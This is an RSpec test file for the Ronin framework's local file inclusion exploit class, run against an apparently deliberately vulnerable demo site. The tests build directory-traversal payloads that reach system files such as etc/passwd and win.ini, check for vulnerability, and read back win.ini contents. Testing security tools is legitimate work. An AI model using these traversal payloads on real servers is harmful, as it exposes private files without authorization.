require 'spec_helper'
require 'ronin/exploits/lfi'

describe Exploits::LFI do
  let(:host)          { 'testasp.vulnweb.com' }
  let(:path)          { '/Templatize.asp' }
  let(:query)         { 'item=html/about.html' }
  let(:query_param)   { 'item' }

  let(:exploit) do
    described_class.new(
      :host            => host,
      :url_path        => path,
      :url_query       => query,
      :url_query_param => {:name => query_param}
    )
  end
  subject { exploit }

  describe "#leading" do
    it "should default to false" do
      subject.leading.should be_false
    end
  end

  describe "#traversal" do
    it "should default to the maximum traversal" do
      subject.traversal.should == described_class::MAX_TRAVERSAL
    end
  end

  describe "#terminate" do
    it "should default to false" do
      subject.terminate.should be_false
    end
  end

  describe "#platform" do
    it "should default to :unix" do
      subject.platform.should == :unix
    end
  end

  describe "#path_separator" do
    subject { exploit.path_separator }

    it { should == '/' }

    context "on Windows platforms" do
      before { exploit.platform = :windows }

      it { should == "\\" }
    end
  end

  describe "#escape_path" do
    let(:local_path) { 'etc/passwd' }

    it "should traverse up n directories" do
      escaped_path = subject.escape_path(local_path)

      escaped_path.should be_end_with(('../' * subject.traversal) + local_path)
    end

    context "with leading separator" do
      before { subject.leading = true }

      it "should prepend a directory separator too the path" do
        escaped_path = subject.escape_path(local_path)

        escaped_path.should be_end_with('/' + ('../' * subject.traversal) + local_path)
      end
    end

    context "with terminated paths" do
      before { subject.terminate = true }

      it "should terminating the path with a %0 character" do
        escaped_path = subject.escape_path(local_path)

        escaped_path.should be_end_with("#{local_path}%0")
      end
    end

    context "on Windows platforms" do
      let(:local_path) { 'windows\win.ini' }

      before { subject.platform = :windows }

      it "should traverse up n directories" do
        escaped_path = subject.escape_path(local_path)

        escaped_path.should be_end_with(("..\\" * subject.traversal) + local_path)
      end

      context "with leading separator" do
        before { subject.leading = true }

        it "should prepend a directory separator too the path" do
          escaped_path = subject.escape_path(local_path)

          escaped_path.should be_end_with("\\" + ("..\\" * subject.traversal) + local_path)
        end
      end

      context "with terminated paths" do
        before { subject.terminate = true }

        it "should terminating the path with a %0 character" do
          escaped_path = subject.escape_path(local_path)

          escaped_path.should be_end_with("#{local_path}%0")
        end
      end
    end
  end

  describe "#exploit_url" do
    let(:local_path)   { 'etc/passwd' }
    let(:escaped_path) { ('../' * subject.traversal) + local_path }

    it "should set the query_param to the escaped path" do
      uri = subject.exploit_url(local_path)

      uri.query_params[query_param].should == escaped_path
    end
  end

  describe "#test_file", :network => true do
    let(:local_path) { 'windows\system.ini' }
    let(:pattern)    { /\[driver32\]/ }

    before { subject.platform = :windows }

    it "should test if a local file can be included in the body" do
      subject.test_file(local_path,pattern).should be_true
    end
  end

  describe "#vulnerable?", :network => true do
    it "should test known files for each platform" do
      subject.should be_vulnerable
    end

    it "should detect the platform" do
      subject.vulnerable?

      subject.platform.should == :windows
    end
  end

  describe "#fs_read", :network => true do
    let(:local_path) { 'windows\win.ini' }
    let(:expected)   {
      "[Mail]\r\nMAPI=1\r\n[MCI Extensions.BAK]\r\naif=MPEGVideo\r\naifc=MPEGVideo\r\naiff=MPEGVideo\r\nasf=MPEGVideo\r\nasx=MPEGVideo\r\nau=MPEGVideo\r\nm1v=MPEGVideo\r\nm3u=MPEGVideo\r\nmp2=MPEGVideo\r\nmp2v=MPEGVideo\r\nmp3=MPEGVideo\r\nmpa=MPEGVideo\r\nmpe=MPEGVideo\r\nmpeg=MPEGVideo\r\nmpg=MPEGVideo\r\nmpv2=MPEGVideo\r\nsnd=MPEGVideo\r\nwax=MPEGVideo\r\nwm=MPEGVideo\r\nwma=MPEGVideo\r\nwmv=MPEGVideo\r\nwmx=MPEGVideo\r\nwpl=MPEGVideo\r\nwvx=MPEGVideo\r\n"
    }

    before { subject.platform = :windows }

    it "should extract the file from the response" do
      file = subject.fs_read(local_path,0)

      file.should == expected
    end

    context "when requesting missing files" do
      let(:bad_path) { 'nope' }

      it "should raise a Errno::ENOENT exception" do
        lambda {
          subject.fs_read(bad_path,0)
        }.should raise_error(Errno::ENOENT)
      end
    end
  end
end
